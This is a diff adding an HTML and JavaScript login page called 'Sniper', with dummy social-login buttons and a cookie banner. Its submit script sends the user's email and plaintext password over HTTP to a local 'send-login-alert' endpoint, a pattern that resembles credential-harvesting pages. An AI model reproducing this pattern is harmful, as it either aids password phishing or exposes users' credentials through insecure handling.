@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page - Sniper</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body class="bg-white font-sans text-gray-900 min-h-screen flex flex-col items-center justify-center relative">
+
+    <div class="w-full max-w-md px-6 py-12">
+        <div class="text-center mb-8">
+            <h1 class="text-2xl font-bold flex items-center justify-center gap-2">
+                <span class="bg-blue-900 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm">N</span> Sniper
+            </h1>
+            <p class="text-xl font-semibold mt-4">Welcome back</p>
+        </div>
+
+        <div class="space-y-3 mb-6">
+            <button class="w-full flex items-center justify-center gap-3 border border-gray-300 py-2.5 rounded-lg hover:bg-gray-50 transition active:scale-95">
+                <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" class="w-5 h-5">
+                <span class="text-sm font-medium">Sign in with Google</span>
+            </button>
+            <button class="w-full flex items-center justify-center gap-3 border border-gray-300 py-2.5 rounded-lg hover:bg-gray-50 transition active:scale-95">
+                <i class="fa-brands fa-apple text-xl"></i>
+                <span class="text-sm font-medium">Sign in with Apple</span>
+            </button>
+            <button class="w-full border border-gray-300 py-2.5 rounded-lg text-sm font-medium hover:bg-gray-50 transition active:scale-95">
+                Sign in with SSO
+            </button>
+        </div>
+
+        <div class="relative flex py-5 items-center">
+            <div class="flex-grow border-t border-gray-200"></div>
+        </div>
+
+        <form id="loginForm" class="space-y-5">
+            <div>
+                <label class="block text-sm font-medium mb-1">Email</label>
+                <input id="emailInput" type="email" placeholder="Enter your email" required
+                    class="w-full border border-gray-300 px-4 py-2.5 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all">
+            </div>
+
+            <div>
+                <div class="flex justify-between items-center mb-1">
+                    <label class="text-sm font-medium">Password</label>
+                    <a href="#" class="text-xs text-gray-500 hover:underline">Forgot your password?</a>
+                </div>
+                <div class="relative">
+                    <input id="password" type="password" placeholder="••••••••" required
+                        class="w-full border border-gray-300 px-4 py-2.5 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all">
+                    
+                    <button type="button" id="togglePassword" class="absolute right-3 top-3 text-gray-400 hover:text-gray-600">
+                        <i id="eyeIcon" class="fa-regular fa-eye"></i>
+                    </button>
+                </div>
+            </div>
+
+            <button type="submit" id="signInBtn" disabled 
+                class="w-full bg-gray-300 text-white py-3 rounded-lg font-semibold cursor-not-allowed transition-all">
+                login
+            </button>
+        </form>
+
+        <p class="text-center text-sm mt-6 text-gray-600">
+            Don't have an account? <a href="signup.html" class="text-black font-semibold hover:underline">Sign up</a>
+        </p>
+    </div>
+
+    <div id="cookieBanner" class="fixed bottom-6 right-6 w-full max-w-sm bg-white border border-gray-100 shadow-2xl rounded-2xl p-6 transition-all duration-500">
+        <div class="flex justify-between items-start mb-4">
+            <h3 class="font-bold text-lg">We value your privacy</h3>
+            <span class="text-yellow-500">✨</span>
+        </div>
+        <p class="text-xs text-gray-600 leading-relaxed mb-6">
+            By clicking "Accept All Cookies", you agree to the storing of cookies on your device to enhance site navigation, analyze site usage, and assist in our marketing efforts.
+        </p>
+        <div class="flex gap-2 justify-between">
+            <button onclick="closeBanner()" class="text-xs font-bold px-4 py-2 hover:bg-gray-100 rounded">REJECT ALL</button>
+            <button onclick="closeBanner()" class="text-xs font-bold px-4 py-2 hover:bg-gray-100 rounded">CUSTOMIZE</button>
+            <button onclick="closeBanner()" class="text-xs font-bold bg-black text-white px-4 py-2 rounded-full hover:bg-gray-800 transition">ACCEPT ALL COOKIES</button>
+        </div>
+    </div>
+
+    <script>
+        const togglePassword = document.querySelector('#togglePassword');
+        const passwordInput = document.querySelector('#password');
+        const eyeIcon = document.querySelector('#eyeIcon');
+        const emailInput = document.querySelector('#emailInput');
+        const signInBtn = document.querySelector('#signInBtn');
+        const loginForm = document.querySelector('#loginForm');
+
+        // Toggle Password
+        togglePassword.addEventListener('click', () => {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            eyeIcon.classList.toggle('fa-eye');
+            eyeIcon.classList.toggle('fa-eye-slash');
+        });
+
+        // Form Validation
+        const validateForm = () => {
+            const isEmailValid = emailInput.value.includes('@') && emailInput.value.includes('.');
+            const isPasswordValid = passwordInput.value.length >= 6;
+
+            if (isEmailValid && isPasswordValid) {
+                signInBtn.disabled = false;
+                signInBtn.classList.remove('bg-gray-300', 'cursor-not-allowed');
+                signInBtn.classList.add('bg-black', 'hover:bg-gray-800', 'cursor-pointer');
+            } else {
+                signInBtn.disabled = true;
+                signInBtn.classList.add('bg-gray-300', 'cursor-not-allowed');
+                signInBtn.classList.remove('bg-black', 'hover:bg-gray-800', 'cursor-pointer');
+            }
+        };
+
+        emailInput.addEventListener('input', validateForm);
+        passwordInput.addEventListener('input', validateForm);
+
+        // NEW: Submit Logic to send data to server
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            signInBtn.innerText = "Verifying...";
+            signInBtn.disabled = true;
+
+            try {
+                // This fetches your local server. Make sure node server.js is running!
+                const response = await fetch('http://localhost:3000/send-login-alert', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        email: emailInput.value, 
+                        password: passwordInput.value 
+                    })
+                });
+
+                if (response.ok) {
+                    window.location.href = '/dashboard.html';
+                } else {
+                    alert('Error: Server could not process the request.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Connection Failed: Is your Node.js server running on localhost:3000?');
+            } finally {
+                signInBtn.innerText = "Sign in";
+                signInBtn.disabled = false;
+            }
+        });
+
+        function closeBanner() {
+            const banner = document.querySelector('#cookieBanner');
+            banner.style.opacity = '0';
+            banner.style.transform = 'translateY(20px)';
+            setTimeout(() => banner.remove(), 500);
+        }
+    </script>
+</body>
+</html>
